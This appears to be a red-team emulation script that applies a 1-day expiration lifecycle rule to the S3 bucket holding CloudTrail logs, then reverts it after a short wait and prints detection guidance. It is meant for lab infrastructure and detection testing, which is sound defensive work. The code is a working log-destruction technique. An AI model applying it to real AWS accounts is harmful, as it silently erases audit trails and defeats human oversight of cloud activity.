"""
Technique : aws.defense-evasion.cloudtrail-lifecycle-rule
Tactic    : Defense Evasion (T1562.001)
Source    : https://stratus-red-team.cloud/attack-techniques/AWS/aws.defense-evasion.cloudtrail-lifecycle-rule/

Pre-requisites:
  - Run `pulumi up` in ../infra/ first to create the target CloudTrail trail.

How the attack works:
  An attacker with s3:PutBucketLifecycleConfiguration can add a 1-day
  expiration lifecycle rule to the S3 bucket storing CloudTrail logs.
  Within 24 hours, all historical and future CloudTrail logs are automatically
  deleted by S3 — the trail remains active and appears healthy, but its logs
  disappear silently.

Detection signal:
  - s3:PutBucketLifecycleConfiguration on a bucket containing CloudTrail logs.
  - Lifecycle rule ID "nuke-cloudtrail-logs-after-1-day" is the canonical
    Stratus indicator.

Revert:
  - Automated: s3:DeleteBucketLifecycle removes the rule.
"""

import sys
if hasattr(sys.stdout, "reconfigure"):
    sys.stdout.reconfigure(encoding="utf-8", errors="replace")  # type: ignore[union-attr]
if hasattr(sys.stderr, "reconfigure"):
    sys.stderr.reconfigure(encoding="utf-8", errors="replace")  # type: ignore[union-attr]

import json
import os
import subprocess
import time
from pathlib import Path

import boto3
from botocore.exceptions import ClientError


# ── Config ────────────────────────────────────────────────────────────────────

LIFECYCLE_RULE_ID = "nuke-cloudtrail-logs-after-1-day"
DWELL_TIME_S      = 5


# ── Helpers ───────────────────────────────────────────────────────────────────

def get_pulumi_outputs(stack_dir: str) -> dict:
    result = subprocess.run(
        ["pulumi", "stack", "output", "--json", "--show-secrets"],
        cwd=stack_dir,
        capture_output=True,
        text=True,
        env={**os.environ, "PULUMI_CONFIG_PASSPHRASE": os.environ.get("PULUMI_CONFIG_PASSPHRASE", "")},
    )
    if result.returncode != 0:
        print(f"[!] pulumi stack output failed: {result.stderr.strip()}")
        return {}
    return json.loads(result.stdout)


def banner(msg: str) -> None:
    print(f"\n{'=' * 60}")
    print(f"  {msg}")
    print(f"{'=' * 60}")


# ── Main ──────────────────────────────────────────────────────────────────────

def main() -> None:
    stack_dir   = str(Path(__file__).parent.parent / "infra")
    infra       = get_pulumi_outputs(stack_dir)
    bucket_name = infra.get("bucket_name", "")
    trail_name  = infra.get("trail_name",  "stratus-red-team-ct-lifecycle-trail")

    if not bucket_name:
        print("[!] bucket_name not found in Pulumi outputs. Did you run `pulumi up`?")
        return

    session   = boto3.Session()
    s3_client = session.client("s3")

    # ── Step 1: Add destructive lifecycle rule ────────────────────────────────
    banner("Step 1 — Add 1-day expiration lifecycle rule (PutBucketLifecycleConfiguration)")
    lifecycle_config = {
        "Rules": [
            {
                "ID":     LIFECYCLE_RULE_ID,
                "Status": "Enabled",
                "Filter": {"Prefix": ""},
                "Expiration": {"Days": 1},
                "NoncurrentVersionExpiration": {"NoncurrentDays": 1},
            }
        ]
    }
    try:
        s3_client.put_bucket_lifecycle_configuration(
            Bucket=bucket_name,
            LifecycleConfiguration=lifecycle_config,
        )
        print(f"  [+] Lifecycle rule applied to bucket: {bucket_name}")
        print(f"  [+] Rule ID: {LIFECYCLE_RULE_ID}")
        print(f"  [+] All objects will expire in 1 day")
        print(f"  [!] CloudTrail event: s3:PutBucketLifecycleConfiguration")
        print(f"  [!] CloudTrail logs for trail '{trail_name}' will be auto-deleted.")
    except ClientError as exc:
        print(f"  [!] PutBucketLifecycleConfiguration failed: {exc}")
        return

    print(f"\n  Dwelling for {DWELL_TIME_S}s...")
    time.sleep(DWELL_TIME_S)

    # ── Revert ────────────────────────────────────────────────────────────────
    banner("Revert — Remove lifecycle rule (DeleteBucketLifecycle)")
    try:
        s3_client.delete_bucket_lifecycle(Bucket=bucket_name)
        print(f"  [+] Lifecycle rule deleted from: {bucket_name}")
    except ClientError as exc:
        print(f"  [!] DeleteBucketLifecycle failed: {exc}")

    banner("Complete")
    print("CloudTrail events: s3:PutBucketLifecycleConfiguration, s3:DeleteBucketLifecycle")
    print("\nDetection guidance:")
    print("  Alert when s3:PutBucketLifecycleConfiguration targets a bucket")
    print("  that stores CloudTrail logs, especially with short expiration windows.")
    print("\nRun `pulumi destroy` in ../infra/ to remove the trail and bucket.")


if __name__ == "__main__":
    main()
